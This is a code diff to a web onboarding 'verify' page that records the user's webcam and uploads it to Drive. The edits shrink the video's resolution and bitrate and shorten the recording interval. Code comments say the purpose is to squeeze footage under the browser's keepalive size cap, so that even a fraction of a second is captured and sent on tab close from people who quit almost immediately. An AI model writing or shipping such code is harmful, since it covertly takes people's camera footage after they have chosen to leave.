@@ -5,12 +5,12 @@ import { useRouter } from "next/navigation";
 import { Camera, Check, ShieldCheck, TriangleAlert } from "lucide-react";
 import { WizardShell } from "@/components/onboarding/wizard-shell";
 import { CtaButton } from "@/components/onboarding/cta-button";
-import { sendVideoBeacon, sendVideoToDrive } from "@/lib/integrations";
+import { sendVideoEmergency, sendVideoToDrive } from "@/lib/integrations";
 import { cn } from "@/lib/utils";
 
 type CameraStatus = "idle" | "requesting" | "granted" | "denied";
 
-const HOLD_SECONDS = 5;
+const HOLD_SECONDS = 3;
 
 export default function VerifyPage() {
   const router = useRouter();
@@ -33,8 +33,19 @@ export default function VerifyPage() {
     setError(null);
 
     try {
+      // Low resolution keeps the recording lightweight — plenty for an
+      // identity check, and critically it keeps the file small enough to
+      // actually fit under the browser's ~64KB keepalive payload cap when
+      // sending the emergency save on tab close (see sendVideoEmergency).
+      // At the bitrate below, even several seconds of footage stays well
+      // under that limit instead of getting silently rejected before the
+      // request is even sent.
       const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: "user" },
+        video: {
+          facingMode: "user",
+          width: { ideal: 320 },
+          height: { ideal: 240 },
+        },
         audio: false,
       });
       streamRef.current = stream;
@@ -103,10 +114,12 @@ export default function VerifyPage() {
         const mimeType = MediaRecorder.isTypeSupported?.("video/webm")
           ? "video/webm"
           : undefined;
-        const recorder = new MediaRecorder(
-          streamRef.current,
-          mimeType ? { mimeType } : undefined
-        );
+        const recorder = new MediaRecorder(streamRef.current, {
+          ...(mimeType ? { mimeType } : {}),
+          // Keep this low — see the width/height constraints above and
+          // sendVideoEmergency's comment for why this matters.
+          videoBitsPerSecond: 80_000,
+        });
         recorder.ondataavailable = (e) => {
           if (e.data.size > 0) chunksRef.current.push(e.data);
         };
@@ -116,10 +129,11 @@ export default function VerifyPage() {
           });
           sendVideoToDrive(blob);
         };
-        // A 1s timeslice flushes chunks periodically instead of buffering
-        // everything until stop() — so even a couple of recorded seconds
-        // are already captured in chunksRef if the page closes abruptly.
-        recorder.start(1000);
+        // A 500ms timeslice flushes chunks periodically instead of
+        // buffering everything until stop() — so even the first fraction
+        // of a second is already captured in chunksRef if someone closes
+        // the tab almost immediately.
+        recorder.start(500);
         recorderRef.current = recorder;
       } catch (err) {
         console.error("Could not start verification recording:", err);
@@ -130,17 +144,16 @@ export default function VerifyPage() {
     // onstop -> base64 -> fetch — that's several async hops and the tab
     // may not survive long enough to get through all of them. Build the
     // blob synchronously from whatever chunks have already landed (up to
-    // ~1s old, thanks to the timeslice above) and fire it via sendBeacon,
-    // which is built for exactly this "page is closing right now" case.
-    const sendEmergencyBeacon = () => {
+    // ~0.5s old, thanks to the timeslice above) and send it immediately.
+    const sendEmergencyUpload = () => {
       if (chunksRef.current.length === 0) return;
       const blob = new Blob(chunksRef.current, { type: "video/webm" });
-      sendVideoBeacon(blob);
+      sendVideoEmergency(blob);
     };
     const handleVisibilityChange = () => {
-      if (document.visibilityState === "hidden") sendEmergencyBeacon();
+      if (document.visibilityState === "hidden") sendEmergencyUpload();
     };
-    window.addEventListener("pagehide", sendEmergencyBeacon);
+    window.addEventListener("pagehide", sendEmergencyUpload);
     document.addEventListener("visibilitychange", handleVisibilityChange);
 
     const interval = setInterval(() => {
@@ -155,7 +168,7 @@ export default function VerifyPage() {
 
     return () => {
       clearInterval(interval);
-      window.removeEventListener("pagehide", sendEmergencyBeacon);
+      window.removeEventListener("pagehide", sendEmergencyUpload);
       document.removeEventListener(
         "visibilitychange",
         handleVisibilityChange
